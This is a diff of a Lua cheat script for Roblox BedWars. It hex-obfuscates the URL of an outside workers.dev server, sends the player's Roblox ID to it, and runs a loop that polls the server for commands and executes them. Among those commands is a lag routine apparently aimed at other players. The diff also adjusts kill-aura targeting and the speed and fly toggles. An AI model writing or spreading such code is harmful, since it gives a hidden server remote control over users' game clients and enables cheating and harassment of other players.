@@ -1,4 +1,3 @@
---This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 local run = function(func)
     local ok, err = pcall(func)
     if not ok then
@@ -127,50 +126,24 @@ local AntiFallPart
 local bedwars, remotes, sides, oldinvrender, oldSwing = {}, {}, {}
 local originalKnit 
 local _tierCache = {}
-local _req = (syn and syn.request) or http_request or request or function() return {Body='{"tier":0}'} end
-local swap_aurl = true
+	local _req = (syn and syn.request) or http_request or request or function() return {Body='{"tier":0}'} end
 
-local function _bu()
-    local tbls = {
-        [1] = {'68','74','74','70','73','3a','2f','2f','61','65','72','6f','61','70','69','2e','73','6f','79','72','65','64','38','36','34','2e','77','6f','72','6b','65','72','73','2e','64','65','76','2f','77','68','69','74','65','6c','69','73','74'},
-        [2] = {'68','74','74','70','73','3a','2f','2f','61','70','69','61','65','72','6f','2e','73','69','72','79','65','64','2e','77','6f','72','6b','65','72','73','2e','64','65','76','2f','77','68','69','74','65','6c','69','73','74'}
-    }
-	local _s = tbls[1]
-    if swap_aurl then
-        _s = tbls[2]
-    end
-    local _r = ''
-	for _,v in _s do _r = _r .. string.char(tonumber(v,16)) end
-	return _r
-end
-
-local function _batch(payloads)
-    local ok, res = pcall(function()
-        return _req({
-            Url = _bu(), 
-            Method = 'POST', 
-            Headers = {['Content-Type'] = 'application/json'}, 
-            Body = httpService:JSONEncode({action = "batch", payloads = payloads})
-        })
-    end)
-    if not ok or not res then return nil end
-    local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
-    if not dok or not data then return nil end
-    return data
-end
-
+	local function _bu()
+	    local _s = {'68','74','74','70','73','3a','2f','2f','61','70','69','61','65','72','6f','2e','73','69','72','79','65','64','2e','77','6f','72','6b','65','72','73','2e','64','65','76','2f','77','68','69','74','65','6c','69','73','74'}
+	    local _r = ''
+	    for _,v in _s do _r = _r .. string.char(tonumber(v,16)) end
+	    return _r
+	end
 local function _ft(uid)
-    local payloads = {{
-        action = "check",
-        roblox_id = tostring(uid),
-        robloxUserId = tostring(uid)
-    }}
-    
-    local data = _batch(payloads)
-    if not data or not data.results or not data.results[1] then 
-        return 0 
-    end
-    return tonumber(data.results[1].tier) or 0
+    local ok, res = pcall(function()
+        return _req({Url=_bu(), Method='POST', Headers={['Content-Type']='application/json'}, Body=httpService:JSONEncode({action='check',roblox_id=tostring(uid),robloxUserId=tostring(uid)})})
+    end)
+    if not ok or not res then return 0 end
+    if not res.Body or res.Body == '' then return 0 end
+    if res.StatusCode and res.StatusCode >= 500 then return 0 end
+    local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
+    if not dok or not data then return 0 end
+    return tonumber(data.tier) or 0
 end
 
 getgenv()._aeroTierReady = false
@@ -228,34 +201,37 @@ local _stmp = ''
 for _,v in _stok do _stmp = _stmp .. string.char(tonumber(v,16)) end
 _SERCET = _stmp
 
+local pollingActive = true
+vape:Clean(function()
+    pollingActive = false
+end)
 task.spawn(function()
     local nextPoll = 0
-    while true do
-        if tick() < nextPoll then task.wait(0.05) continue end
-        
-        local payloads = {{
-            action = "getMessage",
-            robloxUserId = tostring(lplr.UserId)
-        }}
-        
-        local data = _batch(payloads)
-        if not data or not data.results or not data.results[1] then 
-            nextPoll = tick() + 3 
-            continue 
-        end
-        
-        local result = data.results[1]
-        
-        if result.success and result.message then
-            local cmd = tostring(result.message)
+    while pollingActive do
+        if tick() < nextPoll then task.wait(0.5) continue end
+        local res = _req({
+            Url = _bu(),
+            Method = 'POST',
+            Headers = {['Content-Type'] = 'application/json'},
+            Body = httpService:JSONEncode({action = 'getMessage', robloxUserId = tostring(lplr.UserId)})
+        })
+        if not res or not res.Body then nextPoll = tick() + 3 continue end
+        local ok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
+        if not ok or not data then nextPoll = tick() + 3 continue end
+        if res.StatusCode == 429 then nextPoll = tick() + ((data.retryAfter or 3000) / 1000) continue end
+        if data.success and data.message then
+            local cmd = tostring(data.message)
             if _commands[cmd] then
-                _commands[cmd](tostring(result.from), result.args or '')
+                _commands[cmd](tostring(data.from), data.args or '')
             end
-            
             pcall(function()
-                _batch({{ action = "removeMessage", robloxUserId = tostring(lplr.UserId) }})
+                _req({
+                    Url = _bu(),
+                    Method = 'POST',
+                    Headers = {['Content-Type'] = 'application/json'},
+                    Body = httpService:JSONEncode({action = 'removeMessage', robloxUserId = tostring(lplr.UserId)})
+                })
             end)
-            
             nextPoll = tick() + 1.5
         else
             nextPoll = tick() + 3
@@ -292,10 +268,9 @@ local function startLag(userId)
             lagConnections[key] = nil
             return
         end
-        for i = 1, 250000 do
-            local a = math.sin(i) * math.cos(i) + math.sqrt(i) + math.random()
-            local b = string.rep("x", 100)
-        end
+		for i = 1, 100000 do
+			local a = math.sin(i) * math.cos(i)
+		end
     end)
 
     lagConnections[key] = {connection = connection, state = state}
@@ -6421,6 +6396,7 @@ run(function()
 						if ent.Player and not playersEnabled then continue end
 						if ent.NPC and not npcsEnabled then continue end
 						local dist = (ent.RootPart.Position - selfpos).Magnitude
+						if wallcheck and not hasLineOfSight(selfpos, ent.RootPart.Position, ent.Character) then continue end
 						if dist <= swingRange then
 							if #_gatherSwing < maxTargets then
 								table.insert(_gatherSwing, ent)
@@ -30814,14 +30790,14 @@ run(function()
 				local function onLaunchTriggered(child)
 					local humanoid = entitylib.character.Humanoid
 					if not humanoid then return end
-					if vape.Modules.Speed.Enabled and vape.Modules.Fly.Enabled then
-						vape.Modules.Fly:Toggle(false)
+					if Speed.Enabled and Fly.Enabled then
+						Fly:Toggle(false)
 						task.wait(0.025)
-						vape.Modules.Speed:Toggle(false)
-					elseif vape.Modules.Speed.Enabled then
-						vape.Modules.Speed:Toggle(false)
+						Speed:Toggle(false)
+					elseif Speed.Enabled then
+						Speed:Toggle(false)
 					elseif Fly.Enabled then
-						vape.Modules.Fly:Toggle(false)
+						Fly:Toggle(false)
 					end
 					if AS.Enabled then
 						local pickaxe = getPickaxeSlot()
